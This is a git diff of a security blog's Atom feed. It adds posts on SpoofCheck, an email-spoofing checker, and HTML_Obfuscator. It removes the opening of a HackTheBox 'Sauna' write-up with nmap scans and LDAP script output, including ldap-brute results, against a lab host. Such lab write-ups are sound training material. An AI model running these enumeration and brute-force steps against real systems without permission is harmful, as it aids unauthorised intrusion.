@@ -1,4 +1,456 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-02T22:53:03+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle>Hacker  RedTeam PenTester CTFPlayer Blogger HackTheBox</subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">My journey towards “TRY HARDER!”</title><link href="http://localhost:4000/otherposts/OSCP/" rel="alternate" type="text/html" title="My journey towards “TRY HARDER!”" /><published>2020-10-17T00:00:00+05:30</published><updated>2020-10-17T00:00:00+05:30</updated><id>http://localhost:4000/otherposts/OSCP</id><content type="html" xml:base="http://localhost:4000/otherposts/OSCP/"><![CDATA[<hr />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-03T11:17:12+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle>Hacker  RedTeam PenTester CTFPlayer Blogger HackTheBox</subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">SpoofCheck.py</title><link href="http://localhost:4000/tools/spoofcheck/" rel="alternate" type="text/html" title="SpoofCheck.py" /><published>2024-11-03T00:00:00+05:30</published><updated>2024-11-03T00:00:00+05:30</updated><id>http://localhost:4000/tools/spoofcheck</id><content type="html" xml:base="http://localhost:4000/tools/spoofcheck/"><![CDATA[<h1 id="spoofcheck-your-first-line-of-defense-against-email-domain-spoofing">Spoofcheck: Your First Line of Defense Against Email Domain Spoofing</h1>
+
+<h2 id="introduction">Introduction</h2>
+<p>In today’s digital landscape, email security remains a critical concern for organizations of all sizes. Email spoofing attacks, where malicious actors impersonate legitimate domains to conduct phishing campaigns or business email compromise (BEC) attacks, continue to pose a significant threat. Enter Spoofcheck, a powerful open-source tool designed to help security professionals identify and prevent domain spoofing vulnerabilities.</p>
+
+<h2 id="link">link</h2>
+<p><a href="https://github.com/DcodeZero/Spoofcheck">SpoofCheck.py</a></p>
+
+<h2 id="what-is-spoofcheck">What is Spoofcheck?</h2>
+<p>Spoofcheck is a security assessment tool that analyzes domain configurations to determine their vulnerability to email spoofing attempts. By examining various email authentication protocols and security measures, it provides valuable insights into potential security gaps that could be exploited by attackers.</p>
+
+<h2 id="why-domain-spoofing-matters">Why Domain Spoofing Matters</h2>
+<h3 id="the-real-world-impact">The Real-World Impact</h3>
+<p>Email spoofing can lead to several serious consequences:</p>
+<ul>
+  <li>Financial losses through BEC attacks</li>
+  <li>Damage to brand reputation</li>
+  <li>Loss of customer trust</li>
+  <li>Data breaches through successful phishing attempts</li>
+  <li>Regulatory compliance issues</li>
+</ul>
+
+<h2 id="key-features">Key Features</h2>
+<p>Spoofcheck helps organizations by:</p>
+<ul>
+  <li>Identifying missing or misconfigured email authentication records</li>
+  <li>Detecting vulnerabilities in domain configurations</li>
+  <li>Providing actionable insights for security improvements</li>
+  <li>Offering a simple way to verify email security posture</li>
+</ul>
+
+<h2 id="understanding-email-authentication">Understanding Email Authentication</h2>
+<p>To appreciate Spoofcheck’s importance, it’s crucial to understand the key email authentication protocols it examines:</p>
+
+<h3 id="spf-sender-policy-framework">SPF (Sender Policy Framework)</h3>
+<p>SPF records specify which mail servers are authorized to send emails on behalf of your domain. Proper SPF configuration is essential for:</p>
+<ul>
+  <li>Preventing unauthorized email sending</li>
+  <li>Reducing spam from your domain</li>
+  <li>Improving email deliverability</li>
+</ul>
+
+<h3 id="dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</h3>
+<p>DKIM adds a digital signature to emails, ensuring:</p>
+<ul>
+  <li>Message integrity</li>
+  <li>Sender authentication</li>
+  <li>Protection against tampering</li>
+</ul>
+
+<h3 id="dmarc-domain-based-message-authentication-reporting-and-conformance">DMARC (Domain-based Message Authentication, Reporting, and Conformance)</h3>
+<p>DMARC builds upon SPF and DKIM by:</p>
+<ul>
+  <li>Providing clear policies for handling authentication failures</li>
+  <li>Offering reporting capabilities</li>
+  <li>Enabling domain-wide email protection</li>
+</ul>
+
+<h2 id="best-practices-for-using-spoofcheck">Best Practices for Using Spoofcheck</h2>
+
+<h3 id="1-regular-testing">1. Regular Testing</h3>
+<ul>
+  <li>Conduct monthly security assessments</li>
+  <li>Test after any DNS changes</li>
+  <li>Verify configurations across all subdomains</li>
+</ul>
+
+<h3 id="2-response-planning">2. Response Planning</h3>
+<ul>
+  <li>Document findings and vulnerabilities</li>
+  <li>Develop remediation plans</li>
+  <li>Implement security improvements promptly</li>
+</ul>
+
+<h3 id="3-integration-with-security-workflows">3. Integration with Security Workflows</h3>
+<ul>
+  <li>Include in security audits</li>
+  <li>Add to penetration testing procedures</li>
+  <li>Incorporate into compliance checks</li>
+</ul>
+
+<h2 id="implementation-guide">Implementation Guide</h2>
+
+<h3 id="getting-started">Getting Started</h3>
+<ol>
+  <li>Install the tool</li>
+  <li>Configure your testing environment</li>
+  <li>Run initial domain checks</li>
+  <li>Review and analyze results</li>
+  <li>Implement necessary changes</li>
+</ol>
+
+<h3 id="common-issues-and-solutions">Common Issues and Solutions</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Issue</th>
+      <th>Impact</th>
+      <th>Solution</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Missing SPF Record</td>
+      <td>High</td>
+      <td>Create and implement SPF record</td>
+    </tr>
+    <tr>
+      <td>Weak DMARC Policy</td>
+      <td>Medium</td>
+      <td>Strengthen DMARC policy settings</td>
+    </tr>
+    <tr>
+      <td>Incomplete DKIM</td>
+      <td>High</td>
+      <td>Configure DKIM signing for all mail streams</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="advanced-usage-tips">Advanced Usage Tips</h2>
+<ul>
+  <li>Automate regular checks</li>
+  <li>Monitor for configuration changes</li>
+  <li>Integrate with existing security tools</li>
+  <li>Track improvements over time</li>
+</ul>
+
+<h2 id="security-considerations">Security Considerations</h2>
+<p>When using Spoofcheck, remember to:</p>
+<ul>
+  <li>Keep the tool updated</li>
+  <li>Use in conjunction with other security measures</li>
+  <li>Follow security best practices</li>
+  <li>Document all findings and changes</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In an era where email-based attacks are becoming increasingly sophisticated, tools like Spoofcheck play a crucial role in maintaining robust email security. By regularly assessing your domain’s vulnerability to spoofing attempts, you can protect your organization from potentially devastating attacks and maintain the trust of your stakeholders.</p>
+
+<h2 id="resources-for-further-reading">Resources for Further Reading</h2>
+<ul>
+  <li>Email Authentication Standards Documentation</li>
+  <li>Anti-Phishing Working Group Guidelines</li>
+  <li>NIST Email Security Recommendations</li>
+  <li>Industry Best Practices for Email Security</li>
+</ul>
+
+<hr />
+
+<p><em>Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python," /><category term="Go-lang" /><summary type="html"><![CDATA[This tool checks if domain spoofing is possible or not.]]></summary></entry><entry><title type="html">HTML-Obfuscator</title><link href="http://localhost:4000/tools/HTML-Obfuscator/" rel="alternate" type="text/html" title="HTML-Obfuscator" /><published>2024-10-02T00:00:00+05:30</published><updated>2024-10-02T00:00:00+05:30</updated><id>http://localhost:4000/tools/HTML-Obfuscator</id><content type="html" xml:base="http://localhost:4000/tools/HTML-Obfuscator/"><![CDATA[<h1 id="html_obfuscator-a-python-tool-for-html-code-protection">HTML_Obfuscator: A Python Tool for HTML Code Protection</h1>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#understanding-html-obfuscation">Understanding HTML Obfuscation</a></li>
+  <li><a href="#features-overview">Features Overview</a></li>
+  <li><a href="#installation-guide">Installation Guide</a></li>
+  <li><a href="#usage-instructions">Usage Instructions</a></li>
+  <li><a href="#advanced-features">Advanced Features</a></li>
+  <li><a href="#best-practices">Best Practices</a></li>
+  <li><a href="#use-cases">Use Cases</a></li>
+  <li><a href="#technical-deep-dive">Technical Deep Dive</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ul>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>In the world of web development, protecting your HTML source code from unauthorized copying or reverse engineering is increasingly important. HTML_Obfuscator emerges as a powerful Python-based solution that enables developers to obfuscate and de-obfuscate HTML files efficiently, offering both single-file and batch processing capabilities.</p>
+
+<h2 id="understanding-html-obfuscation">Understanding HTML Obfuscation</h2>
+
+<h3 id="what-is-html-obfuscation">What is HTML Obfuscation?</h3>
+<p>HTML obfuscation is the process of transforming readable HTML code into a more complex, harder-to-understand format while maintaining its functionality. This technique helps:</p>
+
+<ul>
+  <li>Protect intellectual property</li>
+  <li>Prevent unauthorized code copying</li>
+  <li>Make reverse engineering more difficult</li>
+  <li>Reduce code readability for potential attackers</li>
+</ul>
+
+<h3 id="why-use-html_obfuscator">Why Use HTML_Obfuscator?</h3>
+<ul>
+  <li><strong>Simplicity</strong>: Easy-to-use Python interface</li>
+  <li><strong>Batch Processing</strong>: Handle multiple files simultaneously</li>
+  <li><strong>Reversible</strong>: Built-in de-obfuscation capability</li>
+  <li><strong>Flexibility</strong>: Various output options</li>
+  <li><strong>Performance</strong>: Minimal impact on page load times</li>
+</ul>
+
+<h2 id="features-overview">Features Overview</h2>
+
+<h3 id="core-capabilities">Core Capabilities</h3>
+<ol>
+  <li><strong>Single File Processing</strong>
+    <ul>
+      <li>Obfuscate individual HTML files</li>
+      <li>Generate protected output files</li>
+      <li>Maintain original functionality</li>
+    </ul>
+  </li>
+  <li><strong>Batch Processing</strong>
+    <ul>
+      <li>Process entire directories</li>
+      <li>Maintain folder structure</li>
+      <li>Bulk operation support</li>
+    </ul>
+  </li>
+  <li><strong>De-obfuscation Support</strong>
+    <ul>
+      <li>Reverse obfuscation process</li>
+      <li>Restore original code format</li>
+      <li>Debug obfuscated files</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="installation-guide">Installation Guide</h2>
+
+<h3 id="prerequisites">Prerequisites</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Required Python version</span>
+Python 3.x
+</code></pre></div></div>
+
+<h3 id="setup-process">Setup Process</h3>
+<ol>
+  <li>Clone the repository:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/DcodeZero/Html_Obfuscator
+</code></pre></div>    </div>
+  </li>
+  <li>Navigate to directory:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Html_Obfuscator
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="usage-instructions">Usage Instructions</h2>
+
+<h3 id="basic-commands">Basic Commands</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Single file obfuscation</span>
+python html_obfuscator.py <span class="nt">-oF</span> input.html <span class="nt">-o</span> output.html
+
+<span class="c"># Directory processing</span>
+python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> /path/to/directory <span class="nt">-O</span> /output/directory
+
+<span class="c"># De-obfuscation</span>
+python html_obfuscator.py <span class="nt">-dF</span> input.html <span class="nt">-o</span> output.html
+</code></pre></div></div>
+
+<h3 id="command-line-arguments">Command Line Arguments</h3>
+<p>| Argument | Description | Example |
+|———-|————-|———|
+| -oF | Obfuscate single file | -oF input.html |
+| -oD | Obfuscate directory | -oD |
+| -dF | De-obfuscate file | -dF obfuscated.html |
+| -dD | De-obfuscate directory | -dD |
+| -p | Path to input file | -p /path/to/file |
+| -P | Path to input directory | -P /path/to/dir |
+| -o | Output file path | -o output.html |
+| -O | Output directory path | -O /output/dir |</p>
+
+<h2 id="advanced-features">Advanced Features</h2>
+
+<h3 id="customization-options">Customization Options</h3>
+<ol>
+  <li><strong>Obfuscation Levels</strong>
+    <ul>
+      <li>Basic encoding</li>
+      <li>Advanced scrambling</li>
+      <li>Custom patterns</li>
+    </ul>
+  </li>
+  <li><strong>Output Formatting</strong>
+    <ul>
+      <li>Minification options</li>
+      <li>Whitespace handling</li>
+      <li>Comment preservation</li>
+    </ul>
+  </li>
+  <li><strong>Batch Processing Controls</strong>
+    <ul>
+      <li>File filtering</li>
+      <li>Directory recursion</li>
+      <li>Error handling</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="best-practices">Best Practices</h2>
+
+<h3 id="when-obfuscating">When Obfuscating</h3>
+<ol>
+  <li><strong>Backup Original Files</strong>
+    <ul>
+      <li>Keep original versions safe</li>
+      <li>Document obfuscation parameters</li>
+      <li>Maintain version control</li>
+    </ul>
+  </li>
+  <li><strong>Testing</strong>
+    <ul>
+      <li>Verify functionality post-obfuscation</li>
+      <li>Check browser compatibility</li>
+      <li>Validate user experience</li>
+    </ul>
+  </li>
+  <li><strong>Performance Considerations</strong>
+    <ul>
+      <li>Monitor file size changes</li>
+      <li>Check load time impact</li>
+      <li>Optimize when necessary</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="use-cases">Use Cases</h2>
+
+<h3 id="development-scenarios">Development Scenarios</h3>
+<ol>
+  <li><strong>Commercial Projects</strong>
+    <ul>
+      <li>Protect proprietary code</li>
+      <li>Secure client deliverables</li>
+      <li>Maintain competitive advantage</li>
+    </ul>
+  </li>
+  <li><strong>Educational Platforms</strong>
+    <ul>
+      <li>Protect assessment content</li>
+      <li>Secure learning materials</li>
+      <li>Prevent solution sharing</li>
+    </ul>
+  </li>
+  <li><strong>Enterprise Applications</strong>
+    <ul>
+      <li>Secure internal tools</li>
+      <li>Protect company assets</li>
+      <li>Maintain code confidentiality</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="technical-deep-dive">Technical Deep Dive</h2>
+
+<h3 id="obfuscation-process">Obfuscation Process</h3>
+<pre><code class="language-mermaid">graph LR
+    A[Input HTML] --&gt; B[Parser]
+    B --&gt; C[Transformer]
+    C --&gt; D[Encoder]
+    D --&gt; E[Output HTML]
+</code></pre>
+
+<h3 id="code-examples">Code Examples</h3>
+
+<h4 id="simple-obfuscation">Simple Obfuscation</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file obfuscation</span>
+python html_obfuscator.py <span class="nt">-oF</span> <span class="nt">-p</span> index.html <span class="nt">-o</span> protected.html
+</code></pre></div></div>
+
+<h4 id="batch-processing">Batch Processing</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Process entire website</span>
+python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> ./website <span class="nt">-O</span> ./protected-site
+</code></pre></div></div>
+
+<h3 id="performance-metrics">Performance Metrics</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Operation</th>
+      <th>Average Time</th>
+      <th>File Size Impact</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Single File</td>
+      <td>&lt; 1 second</td>
+      <td>+5-15%</td>
+    </tr>
+    <tr>
+      <td>Directory (10 files)</td>
+      <td>2-3 seconds</td>
+      <td>+10-20%</td>
+    </tr>
+    <tr>
+      <td>De-obfuscation</td>
+      <td>&lt; 1 second</td>
+      <td>Original size</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="security-considerations">Security Considerations</h2>
+
+<h3 id="protection-level">Protection Level</h3>
+<ul>
+  <li>Basic obfuscation suitable for most use cases</li>
+  <li>Additional security layers recommended for sensitive applications</li>
+  <li>Regular updates to obfuscation patterns advised</li>
+</ul>
+
+<h3 id="limitations">Limitations</h3>
+<ul>
+  <li>Not a replacement for server-side security</li>
+  <li>May impact page load performance</li>
+  <li>Debug capabilities might be affected</li>
+</ul>
+
+<h2 id="troubleshooting-guide">Troubleshooting Guide</h2>
+
+<h3 id="common-issues">Common Issues</h3>
+<ol>
+  <li><strong>File Processing Errors</strong>
+    <ul>
+      <li>Check file permissions</li>
+      <li>Verify file paths</li>
+      <li>Ensure valid HTML input</li>
+    </ul>
+  </li>
+  <li><strong>Output Problems</strong>
+    <ul>
+      <li>Verify output directory exists</li>
+      <li>Check disk space</li>
+      <li>Validate file access rights</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>HTML_Obfuscator provides a robust solution for protecting HTML source code through obfuscation. Its combination of ease of use, batch processing capabilities, and reversible operations makes it an invaluable tool for developers looking to secure their web assets while maintaining functionality.</p>
+
+<h2 id="resources">Resources</h2>
+
+<h3 id="documentation">Documentation</h3>
+<ul>
+  <li><a href="https://github.com/DcodeZero/Html_Obfuscator">Official Repository</a></li>
+  <li><a href="https://github.com/DcodeZero/Html_Obfuscator/issues">Issue Tracker</a></li>
+</ul>
+
+<h3 id="community">Community</h3>
+<ul>
+  <li>Report bugs through GitHub Issues</li>
+  <li>Contribute improvements via Pull Requests</li>
+  <li>Share experiences in Discussions</li>
+</ul>
+
+<hr />
+
+<p><em>Note: Regular updates and community feedback help improve tool effectiveness and security.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python" /><summary type="html"><![CDATA[Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.]]></summary></entry><entry><title type="html">My journey towards “TRY HARDER!”</title><link href="http://localhost:4000/otherposts/OSCP/" rel="alternate" type="text/html" title="My journey towards “TRY HARDER!”" /><published>2020-10-17T00:00:00+05:30</published><updated>2020-10-17T00:00:00+05:30</updated><id>http://localhost:4000/otherposts/OSCP</id><content type="html" xml:base="http://localhost:4000/otherposts/OSCP/"><![CDATA[<hr />
 
 <h1 id="overview">OverView</h1>
 <p>It was <code class="language-plaintext highlighter-rouge">one and half</code> years ago I completed my <code class="language-plaintext highlighter-rouge">C|EH</code> certification. Since then my only <code class="language-plaintext highlighter-rouge">aim</code> was to gain my <code class="language-plaintext highlighter-rouge">OSCP</code> no matter what it takes from me. I was ready to give my complete effort and dedication in order to gain my OSCP. This blog outlines <code class="language-plaintext highlighter-rouge">my journey towards OSCP</code> and I’ll be sharing some hints and guidelines at the end of the blog which can be helpful in gaining your OSCP as well.</p>
@@ -3955,999 +4407,4 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
 <p>Ganana is the very first vulnerable machine created by me and now hosted on <code class="language-plaintext highlighter-rouge">VULNHUB</code>. You can download the machine and play with it. Works better with <code class="language-plaintext highlighter-rouge">Virtual-box</code>.</p>
 
-<p>This is a fairly simple machine rated easy to intermediate. There is only one flag to capture root.txt.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="otherposts" /><category term="linux" /><summary type="html"><![CDATA[Ganana is the very first vulnerable machine created by me and now hosted on `VULNHUB`. You can download the machine and play with it. Works better with `Virtual-box`.]]></summary></entry><entry><title type="html">HackTheBox Sauna</title><link href="http://localhost:4000/hackthebox/Sauna/" rel="alternate" type="text/html" title="HackTheBox Sauna" /><published>2020-06-20T00:00:00+05:30</published><updated>2020-06-20T00:00:00+05:30</updated><id>http://localhost:4000/hackthebox/Sauna</id><content type="html" xml:base="http://localhost:4000/hackthebox/Sauna/"><![CDATA[<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 05:52:33 2020 as: nmap -sV -A -o nmap.sauna 10.10.10.175
-Nmap scan report for 10.10.10.175
-Host is up (0.20s latency).
-Not shown: 988 filtered ports
-PORT     STATE SERVICE       VERSION
-53/tcp   open  domain?
-| fingerprint-strings: 
-|   DNSVersionBindReqTCP: 
-|     version
-|_    bind
-80/tcp   open  http          Microsoft IIS httpd 10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Egotistical Bank :: Home
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 16:53:10Z)
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V=7.80%I=7%D=4/4%Time=5E885906%P=x86_64-pc-linux-gnu%r(DNSVe
-SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
-SF:04bind\0\0\x10\0\x03");
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
-No OS matches for host
-Network Distance: 2 hops
-Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 7h00m03s
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2020-04-04T16:55:52
-|_  start_date: N/A
-
-TRACEROUTE (using port 445/tcp)
-HOP RTT       ADDRESS
-1   197.16 ms 10.10.14.1
-2   198.35 ms 10.10.10.175
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Apr  4 05:58:29 2020 -- 1 IP address (1 host up) scanned in 356.97 seconds  
-</code></pre></div></div>
-
-<h2 id="using-nmap-to-see-any-users-can-be-found-in-the-domain">Using NMAP to see any users can be found in the domain.</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 06:13:39 2020 as: nmap -n -sV -script *ldap* -p 389 -oA script.ldap 10.10.10.175
-Nmap scan report for 10.10.10.175
-Host is up (0.20s latency).
-
-PORT    STATE SERVICE VERSION
-389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
-| ldap-brute: 
-|   root: &lt;empty&gt;=&gt; Valid credentials
-|   admin: &lt;empty&gt;=&gt; Valid credentials
-|   administrator: &lt;empty&gt;=&gt; Valid credentials
-|   webadmin: &lt;empty&gt;=&gt; Valid credentials
-|   sysadmin: &lt;empty&gt;=&gt; Valid credentials
-|   netadmin: &lt;empty&gt;=&gt; Valid credentials
-|   guest: &lt;empty&gt;=&gt; Valid credentials
-|   user: &lt;empty&gt;=&gt; Valid credentials
-|   web: &lt;empty&gt;=&gt; Valid credentials
-|_  test: &lt;empty&gt;=&gt; Valid credentials
-| ldap-rootdse: 
-| LDAP Results
-|   &lt;root&gt;|       domainFunctionality: 7
-|       forestFunctionality: 7
-|       domainControllerFunctionality: 7
-|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
-|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
-|       isGlobalCatalogReady: TRUE
-|       supportedSASLMechanisms: GSSAPI
-|       supportedSASLMechanisms: GSS-SPNEGO
-|       supportedSASLMechanisms: EXTERNAL
-|       supportedSASLMechanisms: DIGEST-MD5
-|       supportedLDAPVersion: 3
-|       supportedLDAPVersion: 2
-|       supportedLDAPPolicies: MaxPoolThreads
-|       supportedLDAPPolicies: MaxPercentDirSyncRequests
-|       supportedLDAPPolicies: MaxDatagramRecv
-|       supportedLDAPPolicies: MaxReceiveBuffer
-|       supportedLDAPPolicies: InitRecvTimeout
-|       supportedLDAPPolicies: MaxConnections
-|       supportedLDAPPolicies: MaxConnIdleTime
-|       supportedLDAPPolicies: MaxPageSize
-|       supportedLDAPPolicies: MaxBatchReturnMessages
-|       supportedLDAPPolicies: MaxQueryDuration
-|       supportedLDAPPolicies: MaxDirSyncDuration
-|       supportedLDAPPolicies: MaxTempTableSize
-|       supportedLDAPPolicies: MaxResultSetSize
-|       supportedLDAPPolicies: MinResultSets
-|       supportedLDAPPolicies: MaxResultSetsPerConn
-|       supportedLDAPPolicies: MaxNotificationPerConn
-|       supportedLDAPPolicies: MaxValRange
-|       supportedLDAPPolicies: MaxValRangeTransitive
-|       supportedLDAPPolicies: ThreadMemoryLimit
-|       supportedLDAPPolicies: SystemMemoryLimitPercent
-|       supportedControl: 1.2.840.113556.1.4.319
-|       supportedControl: 1.2.840.113556.1.4.801
-|       supportedControl: 1.2.840.113556.1.4.473
-|       supportedControl: 1.2.840.113556.1.4.528
-|       supportedControl: 1.2.840.113556.1.4.417
-|       supportedControl: 1.2.840.113556.1.4.619
-|       supportedControl: 1.2.840.113556.1.4.841
-|       supportedControl: 1.2.840.113556.1.4.529
-|       supportedControl: 1.2.840.113556.1.4.805
-|       supportedControl: 1.2.840.113556.1.4.521
-|       supportedControl: 1.2.840.113556.1.4.970
-|       supportedControl: 1.2.840.113556.1.4.1338
-|       supportedControl: 1.2.840.113556.1.4.474
-|       supportedControl: 1.2.840.113556.1.4.1339
-|       supportedControl: 1.2.840.113556.1.4.1340
-|       supportedControl: 1.2.840.113556.1.4.1413
-|       supportedControl: 2.16.840.1.113730.3.4.9
-|       supportedControl: 2.16.840.1.113730.3.4.10
-|       supportedControl: 1.2.840.113556.1.4.1504
-|       supportedControl: 1.2.840.113556.1.4.1852
-|       supportedControl: 1.2.840.113556.1.4.802
-|       supportedControl: 1.2.840.113556.1.4.1907
-|       supportedControl: 1.2.840.113556.1.4.1948
-|       supportedControl: 1.2.840.113556.1.4.1974
-|       supportedControl: 1.2.840.113556.1.4.1341
-|       supportedControl: 1.2.840.113556.1.4.2026
-|       supportedControl: 1.2.840.113556.1.4.2064
-|       supportedControl: 1.2.840.113556.1.4.2065
-|       supportedControl: 1.2.840.113556.1.4.2066
-|       supportedControl: 1.2.840.113556.1.4.2090
-|       supportedControl: 1.2.840.113556.1.4.2205
-|       supportedControl: 1.2.840.113556.1.4.2204
-|       supportedControl: 1.2.840.113556.1.4.2206
-|       supportedControl: 1.2.840.113556.1.4.2211
-|       supportedControl: 1.2.840.113556.1.4.2239
-|       supportedControl: 1.2.840.113556.1.4.2255
-|       supportedControl: 1.2.840.113556.1.4.2256
-|       supportedControl: 1.2.840.113556.1.4.2309
-|       supportedControl: 1.2.840.113556.1.4.2330
-|       supportedControl: 1.2.840.113556.1.4.2354
-|       supportedCapabilities: 1.2.840.113556.1.4.800
-|       supportedCapabilities: 1.2.840.113556.1.4.1670
-|       supportedCapabilities: 1.2.840.113556.1.4.1791
-|       supportedCapabilities: 1.2.840.113556.1.4.1935
-|       supportedCapabilities: 1.2.840.113556.1.4.2080
-|       supportedCapabilities: 1.2.840.113556.1.4.2237
-|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
-|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       isSynchronized: TRUE
-|       highestCommittedUSN: 53385
-|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
-|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
-|       currentTime: 20200404171356.0Z
-|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-| ldap-search: 
-|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
-|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
-|         objectClass: top
-|         objectClass: domain
-|         objectClass: domainDNS
-|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
-|         instanceType: 5
-|         whenCreated: 2020/01/23 05:44:25 UTC
-|         whenChanged: 2020/04/03 23:33:53 UTC
-|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
-|         uSNCreated: 4099
